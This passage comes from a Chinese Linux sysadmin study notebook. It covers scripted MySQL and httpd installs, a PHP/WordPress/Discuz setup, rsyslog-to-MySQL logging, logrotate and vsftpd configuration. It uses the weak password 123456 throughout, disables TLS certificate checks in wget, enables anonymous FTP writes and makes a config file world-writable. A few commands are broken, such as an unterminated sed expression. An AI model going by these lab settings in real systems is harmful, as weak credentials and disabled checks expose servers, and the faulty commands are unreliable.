#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成"
}

check
install_mysql
```

![1654776596899](linuxSRE.assets/1654776596899.png)

##### 37.6.2.3编译安装httpd2.4

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/apps/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo 'PATH=/apps/httpd-2.4.53/bin:$PATH' > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

![1654787061778](linuxSRE.assets/1654787061778.png)

##### 37.6.2.4编译安装httpd模块方式php-7.4

```
#基于10.0.0.7
#0.安装php-7.4相关包
[21:26:51 root@centos7 ~]# yum -y install gcc libxml2-devel bzip2-devel libmcrypt-devel sqlite-devel oniguruma-devel
[21:34:57 root@centos7 ~]# tar xvf php-7.4.19.tar.gz 
[21:34:57 root@centos7 ~]#cd php-7.4.19/



#1.编译php7.4
[root@centos7 ~]# cd php-7.4.19
[root@centos7 php-7.4.19]#./configure --prefix=/apps/php \
--with-config-file-scan-dir=/etc/php.d \--enable-mysqlnd \
--with-mysqli=mysqlnd \
--with-pdo-mysql=mysqlnd \
--with-config-file-path=/etc \
--enable-fpm \
--with-zlib \
--enable-xml \
--enable-mbstring \
--with-openssl \
--enable-sockets \
--enable-maintainer-zts \
--disable-fileinfo


#2.安装
[root@centos7 php-7.4.19]# make -j 8 && make install



#3.查看是否编译成功
[root@centos7 ~]# /apps/php/bin/php --version
PHP 7.4.19 (cli) (built: Jun  9 2022 22:56:51) ( ZTS )
Copyright (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
[root@centos7 ~]# php --version



#4.准备PATH变量
[root@centos7 ~]# vim /etc/profile.d/lamp.sh
PATH=/apps/php/bin:/apps/httpd-2.4.53/bin:$PATH
[root@centos7 ~]# . /etc/profile.d/lamp.sh



#5.准备php配置文件和启动文件
[root@centos7 ~]# cp /root/php-7.4.19/php.ini-production /etc/php.ini
[root@centos7 ~]# cp /root/php-7.4.19/sapi/fpm/php-fpm.service /lib/systemd/system/
[root@centos7 ~]# cd /apps/php/etc/
[root@centos7 etc]# cp php-fpm.conf.default php-fpm.conf
[root@centos7 etc]# cd php-fpm.d/
[root@centos7 php-fpm.d]# cp www.conf.default www.conf



#6.修改进程所有者
[root@centos7 php-fpm.d]# pwd
/apps/php/etc/php-fpm.d
 23 user = apache
 24 group = apache
 239 pm.status_path = /fpm_status
 251 ping.path = /ping
 
 
 
 
#7.支持opcache加速
 [root@centos7 php-fpm.d]# mkdir /etc/php.d/
[root@centos7 php-fpm.d]# vim /etc/php.d/opcache.ini
[opcache]
zend_extension=opcache.so
opcache.enable=1



#8.启动
[root@centos7 php-fpm.d]# systemctl daemon-reload
[root@centos7 php-fpm.d]# systemctl enable --now php-fpm.service
```

编译成功！！！

![1654786345249](linuxSRE.assets/1654786345249.png)

##### 37.6.2.5 10.0.0.7主机相关配置

```
#1.修改httpd.conf配置文件
[root@centos7 php-7.4.19]# vim /apps/httpd-2.4.53/conf/httpd.conf
120 LoadModule proxy_module modules/mod_proxy.so
124 LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
260 <IfModule dir_module>
261     DirectoryIndex index.php index.html
262 </IfModule>
#文件最后加如下两行
AddType application/x-httpd-php .php
ProxyRequests Off


#实现第一个虚拟主机
<virtualhost *:80>
servername blog.liusenbiao.org
documentroot /data/blog
<directory /data/blog>
require all granted
</directory>
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/blog/$1
#实现status和ping页面
ProxyPassMatch ^/(fpm_status|ping)$ fcgi://127.0.0.1:9000/$1
CustomLog "logs/access_blog_log" common
</virtualhost>

#第二个虚拟主机
<virtualhost *:80>
servername forum.liusenbiao.org
documentroot /data/forum
<directory /data/forum/>
require all granted
</directory>
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/forum/$1
CustomLog "logs/access_forum_log" common
</virtualhost>

#2.重启服务
[root@centos7 php-7.4.19]# systemctl restart httpd
```

##### 37.6.2.6 10.0.0.8主机相关配置

```
#0.数据库进行授权
[root@centos8 ~]# mysql -uroot -p123456
mysql> create database blog;
mysql> create database forum;
mysql> create user blog@'10.0.0.%' identified by '123456';
mysql> create user forum@'10.0.0.%' identified by '123456';
mysql> grant all on blog.* to blog@'10.0.0.%';
mysql> grant all on forum.* to forum@'10.0.0.%';
```

##### 37.6.2.7准备wordpress和discuz相关文件

```
#1.解压缩文件
[root@centos7 php-fpm.d]# cd /data/
[root@centos7 data]# mkdir blog forum
[root@centos7 ~]# cd
[root@centos7 ~]# tar xf latest-zh_CN.tar.gz
[root@centos7 ~]# mv wordpress/* /data/blog/
[root@centos7 opt]# unzip Discuz_X3.4_SC_UTF8_20220518.zip
[root@centos7 opt]# mv upload/* /data/forum/


#2.授权apache
[root@centos7 opt]# chown -R apache.apache /data/*



#3.验证实验是否成功
浏览器上分别输入
http://blog.liusenbiao.org/
http://forum.liusenbiao.org/



#4.验证opcache是否加速成功
[root@centos7 data]# cd /data/blog/
[root@centos7 blog]# vim info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>
```

wordpress搭建成功！！！！

![1654792011217](linuxSRE.assets/1654792011217.png)

discuz搭建成功！！！！

![1654792095994](linuxSRE.assets/1654792095994.png)

opcache加速成功！！！

![1654792442240](linuxSRE.assets/1654792442240.png)

## 38.日志服务管理

### 38.1rsyslog管理

#### 38.1.1rsyslog特性

```
#0.rsyslog特性
多线程
UDP, TCP, SSL, TLS, RELP
MySQL, PGSQL, Oracle实现日志存储
强大的过滤器，可实现过滤记录日志信息中任意部分
自定义输出格式




#1.范例：将ssh服务的日志记录至自定义的local的日志设备
#修改sshd服务的配置
[root@centos8 ~]# Vim /etc/ssh/sshd_config
[root@centos8 ~]# SyslogFacility local2
#修改rsyslog的配置
[root@centos8 ~]# vim /etc/rsyslog.conf
[root@centos8 ~]# Local2.* /var/log/sshd.log
[root@centos8 ~]# systemctl restart rsyslog sshd



#3.logger测试
logger -p local2.info "hello sshd"
tail /var/log/sshd.log有记录
```

![1654824899491](linuxSRE.assets/1654824899491.png)

#### 38.1.2启用网络日志服务

![1654830500167](linuxSRE.assets/1654830500167.png)

**环境介绍：**

```
#1.服务器介绍
#10.0.0.8 生成日志
#10.0.0.18 接受远程日志
```

**10.0.0.18：**

```
#1.修改配置文件
root@centos8_1:~# vim /etc/rsyslog.conf
19 module(load="imudp") # needs to be done just once
20 input(type="imudp" port="514")
root@centos8_1:~# systemctl restart rsyslog
root@centos8_1:~# hostnamectl set-hostname rsyslog-server.liusenbiao.org




#2.观察日志
root@rsyslog-server:~# tail -f /var/log/messages
Jun 10 11:00:41 centos8 root[16381]: this is a test log on 10.0.0.8
```

![1654830155613](linuxSRE.assets/1654830155613.png)

**10.0.0.8：**

```
#1.修改配置文件
[root@centos8 ~]# vim /etc/rsyslog.conf
第47行添加以下配置
*.info;mail.none;authpriv.none;cron.none                @10.0.0.18  #UDP
*.info;mail.none;authpriv.none;cron.none                @@10.0.0.18 #TCP
[root@centos8 ~]# systemctl restart rsyslog



#2.测试连接
[root@centos8 ~]# logger "this is a test log on 10.0.0.8"
```
#### 38.1.3常见日志文件

```
/var/log/secure：系统安全日志，文本格式，应周期性分析
/var/log/btmp：当前系统上，用户的失败尝试登录相关的日志信息，二进制格式，lastb命令进行
查看
/var/log/wtmp：当前系统上，用户正常登录系统的相关日志信息，二进制格式，last命令可以查
看
/var/log/lastlog:每一个用户最近一次的登录信息，二进制格式，lastlog命令可以查看
/var/log/dmesg：CentOS7 之前版本系统引导过程中的日志信息，文本格式，开机后的硬件变化
将不再记录
专用命令dmesg查看，可持续记录硬件变化的情况
/var/log/boot.log 系统服务启动的相关信息，文本格式
/var/log/messages ：系统中大部分的信息
/var/log/anaconda : anaconda的日志
```

#### 38.1.4日志管理工具 journalctl

```
#1.journalctl用法
#查看所有日志（默认情况下 ，只保存本次启动的日志）
 journalctl
#查看内核日志（不显示应用日志）
 journalctl -k
#查看系统本次启动的日志
 journalctl -b
 journalctl -b -0
#查看上一次启动的日志（需更改设置）
 journalctl -b -1
#查看指定时间的日志
 journalctl --since="2017-10-30 18:10:30"
 journalctl --since "20 min ago"
 journalctl --since yesterday
 journalctl --since "2017-01-10" --until "2017-01-11 03:00"
 journalctl --since 09:00 --until "1 hour ago"
#显示尾部的最新10行日志
 journalctl -n
#显示尾部指定行数的日志
 journalctl -n 20
#实时滚动显示最新日志
 journalctl -f
#查看指定服务的日志
 journalctl /usr/lib/systemd/systemd
#查看指定进程的日志
 journalctl _PID=1 #查看某个路径的脚本的日志
 journalctl /usr/bin/bash
#查看指定用户的日志
 journalctl _UID=33 --since today
#查看某个 Unit 的日志
 journalctl -u nginx.service
 journalctl -u nginx.service --since today
#实时滚动显示某个 Unit 的最新日志
 journalctl -u nginx.service -f
#合并显示多个 Unit 的日志
 journalctl -u nginx.service -u php-fpm.service --since today
#查看指定优先级（及其以上级别）的日志，共有8级 0: emerg
1: alert
2: crit
3: err
4: warning
5: notice
6: info
7: debug
 journalctl -p err -b
#日志默认分页输出，--no-pager 改为正常的标准输出
 journalctl --no-pager
#日志管理journalctl
#以 JSON 格式（单行）输出
 journalctl -b -u nginx.service -o json
#以 JSON 格式（多行）输出，可读性更好
 journalctl -b -u nginx.serviceqq -o json-pretty
#显示日志占据的硬盘空间
 journalctl --disk-usage
#指定日志文件占据的最大空间
 journalctl --vacuum-size=1G
#指定日志文件保存多久
 journalctl --vacuum-time=1years
```

### 38.2实战案例

#### 38.2.1利用mysql存储日志信息

![1654840121716](linuxSRE.assets/1654840121716.png)

**环境准备：**

```
#0.目标
利用rsyslog日志服务，将收集的日志记录于MySQL中


#1.两台主机
一台：rsyslog日志服务器，IP：10.0.0.18
一台：mysql数据库服务器，IP：10.0.0.28
```

**10.0.0.7:**

```
[17:19:22 root@centos7 ~]#vim /etc/rsyslog.conf
55 *.info;mail.none;authpriv.none;cron.none                @@10.0.0.18
[17:22:36 root@centos7 ~]#systemctl restart rsyslog
[16:41:53 root@centos7 ~]# logger "this is a test log on 10.0.0.7"
```

**10.0.0.8：**

```
[17:19:22 root@centos7 ~]#vim /etc/rsyslog.conf
47 *.info;mail.none;authpriv.none;cron.none                @10.0.0.18
[17:22:36 root@centos7 ~]#systemctl restart rsyslog
[root@centos8 ~]# logger "this is a test log on 10.0.0.8"
```

**10.0.0.18:**

```
#0.安装对应的包
root@rsyslog-server:~# yum -y install rsyslog-mysql



#1.远程传送脚本
root@rsyslog-server:~# scp /usr/share/doc/rsyslog/mysql-createDB.sql 10.0.0.28:



#2.修改配置文件加载ommysql模块
在第25行下面加ommysql模块
#centos8
module(load="ommysql")
#centos7
$ModLoad ommysql
#然后在第47行加如下内容
*.info;mail.none;authpriv.none;cron.none                :ommysql:10.0.0.28,Syslog,rsyslog,123456
root@rsyslog-server:~# systemctl restart rsyslog
```

**10.0.0.28:**

```
#0.安装对应的包
[root@centos8 ~]# yum -y install mysql-server
[root@centos8 ~]# systemctl enable --now mysqld



#1.执行脚本并授权
[root@centos8 ~]# mysql < mysql-createDB.sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| Syslog             |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)
mysql> use Syslog
mysql> show tables;
+------------------------+
| Tables_in_Syslog       |
+------------------------+
| SystemEvents           |
| SystemEventsProperties |
+------------------------+
2 rows in set (0.01 sec)
mysql> create user rsyslog@'10.0.0.%' identified by '123456';
mysql> grant all on Syslog.* to rsyslog@'10.0.0.%';
#查看日志
mysql> select * from SystemEvents\G
```

![1654840416970](linuxSRE.assets/1654840416970.png)

#### 38.2.2通过loganalyzer展示数据库中的日志

**架构图：**

![1654850308125](linuxSRE.assets/1654850308125.png)

**成果图：**

![1654853394488](linuxSRE.assets/1654853394488.png)

**环境准备：**

```
三台主机：
一台日志服务器，利用上一个案例实现，IP：10.0.0.18，
一台数据库服务器，利用上一个案例实现，IP：10.0.0.28
一台当httpd+php 服务器，并安装loganalyzer展示web图形，IP：10.0.0.38
```

**10.0.0.38**：

```
#0.安装相应包
[root@centos8 ~]# yum -y install httpd php-fpm php-mysqlnd php-gd
[root@centos8 ~]# systemctl enable --now httpd php-fpm
# [root@centos8 ~]# systemctl restart httpd php-fpm



#1.修改对应配置文件
[root@centos8 ~]# vim /etc/php-fpm.d/www.conf
listen = 127.0.0.1：9000 #可以不改
#测试连接
[root@centos8 ~]# cd /var/www/html/
[root@centos8 html]# vim info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>
浏览器上输入：http://10.0.0.38/info.php测试




#2.下载图形化工具
[root@centos8 ~]# wget https://download.adiscon.com/loganalyzer/loganalyzer-4.1.12.tar.gz
[root@centos8 ~]# tar xvf loganalyzer-4.1.12.tar.gz
[root@centos8 ~]# mv loganalyzer-4.1.12/src/ /var/www/html/log
浏览器上输入：http://10.0.0.38/log/



#3.分配权限
[root@centos8 ~]# touch /var/www/html/log/config.php
[root@centos8 ~]# chmod 666 /var/www/html/log/config.php
```

![1654851963356](linuxSRE.assets/1654851963356.png)

![1654852194339](linuxSRE.assets/1654852194339.png)

![1654852244558](linuxSRE.assets/1654852244558.png)

![1654852281863](linuxSRE.assets/1654852281863.png)

![1654852639817](linuxSRE.assets/1654852639817.png)

![1654852673323](linuxSRE.assets/1654852673323.png)

![1654852722723](linuxSRE.assets/1654852722723.png)

**10.0.0.7：**

```
[16:42:02 root@centos7 ~]# logger "this is second test log on 10.0.0.7"
```

![1654852884057](linuxSRE.assets/1654852884057.png)

### 38.3logrotate日志转储

logrotate 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，称为日志转储或滚动。可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 cron 程序来执行

#### 38.3.1logrotate配置

```
#0.配置参数说明：

compress 通过gzip压缩转储以后的日志
nocompress 不压缩
copytruncate 用于还在打开中的日志文件，把当前日志备份并截断nocopytruncate 备份日志文件但是不截断
create mode ownergroup转储文件，使用指定的权限，所有者，所属组创建新的日志文件
nocreate 不建立新的日志文件
delaycompress 和 compress 一起使用时，转储的日志文件到下一次转储时才压缩
nodelaycompress 覆盖 delaycompress 选项，转储同时压缩
errors address 专储时的错误信息发送到指定的Email 地址
ifempty 即使是空文件也转储，此为默认选项
notifempty 如果是空文件的话，不转储
mail address 把转储的日志文件发送到指定的E-mail 地址
nomail 转储时不发送日志文件
olddir directory 转储后的日志文件放入指定目录，必须和当前日志文件在同一个文件系统
noolddir 转储后的日志文件和当前日志文件放在同一个目录下
prerotate/endscript 在转储以前需要执行的命令，这两个关键字必须单独成行postrotate/endscript 在转储以后需要执行的命令，这两个关键字必须单独成行
daily 指定转储周期为每天
weekly 指定转储周期为每周
monthly 指定转储周期为每月
rotate count 只保留最近的天数
size size 当日志文件到达指定的大小时才转储，bytes(缺省)及KB或MBsharedscripts默认，对每个转储日志运行prerotate和postrotate脚本，日志文件的绝对路径作为第一个参数传递给脚本。 这意味着单个脚本可以针对与多个文件匹配的日志文件条目多次运行（例如/ var / log / news /*.example）。 如果指定此项sharedscripts，则无论有多少个日志
与通配符模式匹配，脚本都只会运行一次
nosharedscripts 针对每一个转储的日志文件，都执行一次prerotate 和 postrotate脚本，此为默认值
missingok 如果日志不存在，不提示错误，继续处理下一个
nomissingok 如果日志不存在，提示错误，此为默认值
dateext 后缀加年月日
```

#### 38.3.2对指定日志手动执行日志转储

```
#1.生成测试日志
[root@centos8 ~]# dd if=/dev/zero of=/var/log/test1.log bs=2M count=1
[root@centos8 ~]# dd if=/dev/zero of=/var/log/test2.log bs=2M count=1




#2.针对不同的日志创建转储配置文件
[root@centos8 ~]# vim /etc/logrotate.d/test1
/var/log/test1.log {
    daily
    rotate 5
    dateext
    compress
    delaycompress
    missingok
    size 1M
    create 640 bin nobody
    postrotate
    echo `date +%F_%T` >> /data/test1.log
    endscript
}

[root@centos8 ~]# vim /etc/logrotate.d/test2
/var/log/test2.log {
   daily
   rotate 5
   compress
   delaycompress
   missingok
   size 1M
   notifempty
   create 644 root root
   postrotate
   echo `date +%F_%T` >> /data/test2.log
   endscript
}




#3.针对一个测试日志，手动执行日志转储
[root@centos8 ~]# logrotate /etc/logrotate.d/test1
[root@centos8 ~]# ll /var/log/test*
-rw-r----- 1 bin  nobody       0 Jun 10 10:37 /var/log/test1.log
-rw-r--r-- 1 root root   2097152 Jun 10 10:37 /var/log/test1.log.1
-rw-r--r-- 1 root root   2097152 Jun 10 10:04 /var/log/test2.log
[root@centos8 ~]# logrotate /etc/logrotate.conf
[root@centos8 ~]# ll /var/log/test*
-rw-r----- 1 bin  nobody       0 Jun 10 10:37 /var/log/test1.log
-rw-r--r-- 1 root root   2097152 Jun 10 10:37 /var/log/test1.log.1
-rw-r--r-- 1 root root         0 Jun 10 10:41 /var/log/test2.log
-rw-r--r-- 1 root root   2097152 Jun 10 10:04 /var/log/test2.log-20220610
```

#### 38.3.3设置nginx的日志转储

```
cat /etc/logrotate.d/nginx 
/var/log/nginx/*.log {
   daily
   rotate 100
   missingok
   compress
   delaycompress
   notifempty
   create 644 ngnix nginx
   postrotate
      if [ -f /app/nginx/logs/nginx.pid ]; then
          kill -USR1 `cat /app/nginx/logs/nginx.pid`
      fi
   endscript
}
```

## 39.网络文件共享服务

### 39.1存储类型

```
#存储类型分为三种：
直连式存储：Direct-Attached Storage，简称DAS
网络附加存储：Network-Attached Storage，简称NAS
存储区域网络：Storage Area Network，简称SAN
```

![1654867373214](linuxSRE.assets/1654867373214.png)

### 39.2三种存储比较

![1654867502005](linuxSRE.assets/1654867502005.png)

### 39.3FTP服务(掌握)

#### 39.3.1FTP工作原理

![1654869398627](linuxSRE.assets/1654869398627.png)

```
#1.ftp的工作原理
文件传输协议：File Transfer Protocol 早期的三个应用级协议之一，基于C/S结构
数据传输格式：二进制（默认）和文本
双通道协议：命令和数据连接
两种模式：从服务器角度
1.主动(PORT style)：服务器主动连接
命令（控制）：客户端：随机port ---> 服务器：21/tcp(固定)
数据：客户端：随机port <---服务器：20/tcp(主动模式)


2.被动(PASV style)：客户端主动连接
命令（控制）：客户端：随机port ---> 服务器：21/tcp
数据：客户端：随机port ---> 服务器：随机port /tcp(不固定)(被动模式)



#2.服务器被动模式数据端口
227 Entering Passive Mode (172,16,0,1,224,59)
计算公式：
服务器数据端口为：224*256+59
```

#### 39.3.2vsftpd常见配置

```
#1.安装包
[root@centos8 ~]# yum -y install vsftpd
[root@centos8 ~]# systemctl enable --now vsftpd


#2.允许匿名访问
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
listen_port=2121 #修改默认端口号
anonymous_enable=yes
no_anon_password=YES #匿名用户略过口令检查 , 默认NO
anon_world_readable_only=NO #赋予下载权力
anon_other_write_enable=YES #可删除和修改上传的文件，默认NO
[root@centos8 ~]# systemctl restart vsftpd



#3.修改默认家目录
[root@centos8 data]# getent passwd ftp
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin #默认家目录/var/ftp
#创建新的家目录
[root@centos8 data]# mkdir /data/ftproot
[root@centos8 data]# touch /data/ftproot/ftproot.txt
#修改默认家目录
[root@centos8 data]# usermod -d /data/ftproot ftp
[root@centos8 data]# getent passwd ftp
ftp:x:14:50:FTP User:/data/ftproot:/sbin/nologin



#4.匿名用户上传
[root@centos8 data]# vim /etc/vsftpd/vsftpd.conf
anon_upload_enable=YES
anon_mkdir_write_enable=YES
[root@centos8 data]# systemctl restart vsftpd
#赋予pub上传的权限
[root@centos8 data]# setfacl -m u:ftp:rwx /var/ftp/pub/
#赋予根目录上传的权限
[root@centos8 data]# setfacl -m u:ftp:rwx /var/ftp/
#赋予根写权限是很危险的，如果要二次连接就不让连接了，会出现如下错误：
500 OOPS: vsftpd: refusing to run with writable root inside chroot()
#所以要取消根的写权限
[root@centos8 data]# setfacl -b /var/ftp/
我用WINCP上传了ssm源码.md和work2.md
[root@centos8 data]# ll /var/ftp/pub/
total 12
-rw------- 1 ftp ftp   16 Jun 11 11:40 ssm源码.md
-rw------- 1 ftp ftp 5181 Jun 11 11:40 work2.md




#5.指定匿名用户的上传文件的默认的所有者和权限
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
chown_uploads=YES
chown_username=student
chown_upload_mode=0644
[root@centos8 ~]# systemctl restart vsftpd
[root@centos8 ~]# ll /var/ftp/pub/
total 16
-rw-r--r-- 1 student ftp   82 Jun 11 16:58 'Day2 Tomcat_刘森飚.md'




#6.Linux系统用户
local_enable=YES #是否允许linux用户登录
write_enable=YES #允许linux用户上传文件
local_umask=022 #指定系统用户上传文件的默认权限对应umask




#7.将系统用户映射为指定的guest用户
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
guest_enable=YES #所有系统用户都映射成guest用户
guest_username=hehe  # 配合上面选项才生效，指定guest用户
local_root=/ftproot #指定guest用户登录所在目录,但不影响匿名用户的登录目录
user_config_dir=/etc/vsftpd/conf.d/  #指定不同的用户登录进入不同的家目录


[root@centos8 ~]# useradd hehe
[root@centos8 ~]# echo 123456 | passwd --stdin hehe
[root@centos8 ~]# mkdir /etc/vsftpd/conf.d
[root@centos8 ~]# cat /etc/vsftpd/conf.d/student
local_root=/data/ftproot/student
[root@centos8 ~]# cat /etc/vsftpd/conf.d/liu
local_root=/data/ftproot/liu



#8.禁锢系统用户

#8.1禁锢所有系统在家目录中
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
chroot_local_user=YES #禁锢系统用户，默认NO，即不禁锢
[root@centos8 ~]# ll /home/student -d
drwx------ 4 student student 92 Jun 11 16:51 /home/student
[root@centos8 ~]# chmod 555 /home/student
[root@centos8 ~]# ll /home/student -d
dr-xr-xr-x 4 student student 92 Jun 11 16:51 /home/student


#8.2禁锢或不禁锢特定的系统用户在家目录中，与上面设置功能相反
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
chroot_list_enable=YES     #默认是NO
#chroot_list_file=/etc/vsftpd/chroot_list   #默认值
  
当chroot_local_user=YES和chroot_list_enable=YES时，则chroot_list中用户不禁锢，即白名单
当chroot_local_user=NO和chroot_list_enable=YES时， 则chroot_list中用户禁锢，即黑名单


[root@centos8 ~]# cat /etc/vsftpd/chroot_list
student




#9.日志
#wu-ftp 日志：默认启用
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
xferlog_enable=YES 启用记录上传下载日志，此为默认值
xferlog_std_format=YES 使用wu-ftp日志格式，此为默认值
xferlog_file=/var/log/xferlog 可自动生成， 此为默认值

#vsftpd日志：默认不启用
dual_log_enable=YES 使用vsftpd日志格式，默认不启用
vsftpd_log_file=/var/log/vsftpd.log 可自动生成， 此为默认值




#10.提示信息

#10.1登录提示信息
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
ftpd_banner="welcome to liusenbiao ftp server"
banner_file=/etc/vsftpd/ftpbanner.txt  


[root@centos8 ~]# cat /etc/vsftpd/ftpbanner.txt
#^[ 是insert模式下按Ctrl + v + [同时按出来的
^[[1;32mwelcome to liusenbiao ftp server^[[0m
[18:12:41 liu@ubuntu1804 ~]$ftp 10.0.0.8
Connected to 10.0.0.8.
220-welcome to liusenbiao ftp server

#10.2目录访问提示信息
dirmessage_enable=YES 此为默认值
message_file=.message 信息存放在指定目录下.message ，此为默认值,只支持单行说明

[root@centos8 ~]# cd /var/ftp/pub/
[root@centos8 pub]# vim .message
^[[1;31m testdir ^[[0m





#11.PAM模块实现用户访问控制
pam_service_name=vsftpd

#pam配置文件:/etc/pam.d/vsftpd
/etc/vsftpd/ftpusers 默认文件中用户拒绝登录，默认是黑名单
[root@centos8 pub]# vim /etc/pam.d/vsftpd
auth       required     pam_listfile.so item=user sense=deny file=/etc/vsftpd/ftpusers onerr=succeed
#白名单
auth       required     pam_listfile.so item=user sense=allow file=/etc/vsftpd/ftpusers onerr=succeed

[root@centos8 pub]# vim /etc/vsftpd/ftpusers
# Users that are not allowed to login via ftp
root
bin
daemon
adm
lp
sync
shutdown
halt
mail
news
uucp
operator
games
nobody
student  添加禁止student用户登录


#查看日志
root@centos8 pub]# tail -f /var/log/secure
Jun 11 18:42:48 centos8 vsftpd[58165]: pam_listfile(vsftpd:auth): Refused user student for service vsftpd




#12.是否启用控制用户登录的列表文件
userlist_enable=YES   此为默认值
userlist_deny=YES(默认值) 黑名单,不提示口令，NO为白名单
userlist_file=/etc/vsftpd/user_list 此为默认值

#12.1允许root访问
[root@centos8 pub]# vim /etc/vsftpd/ftpusers
#把root删除
[root@centos8 pub]# vim /etc/vsftpd/user_list
#把root删除


#12.2设置白名单
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
userlist_deny=NO
这样user_list里面规定的内容才能访问




#13.连接数限制
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
max_clients=0 #最大并发连接数
max_per_ip=0 #每个IP同时发起的最大连接数




#14.控制传输速率
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
anon_max_rate=0 匿名用户的最大传输速率,以字节为单位,比如:1024000表示1MB/s
local_max_rate=0 本地用户的最大传输速率
#测试匿名下载速度
[root@centos7 ~]#wget ftp://10.0.0.8/pub/bigfile
#测试本地用户下载速度
[root@centos7 ~]#wget ftp://liu:123456@10.0.0.8/bigfile




#15.连接时间：秒为单位
[root@centos8 ~]# vim /etc/vsftpd/vsftpd.conf
connect_timeout=60  #主动模式数据连接超时时长
accept_timeout=60  #被动模式数据连接超时时长
data_connection_timeout=300  #数据连接无数据输超时时长
idle_session_timeout=60  #无命令操作超时时长
```

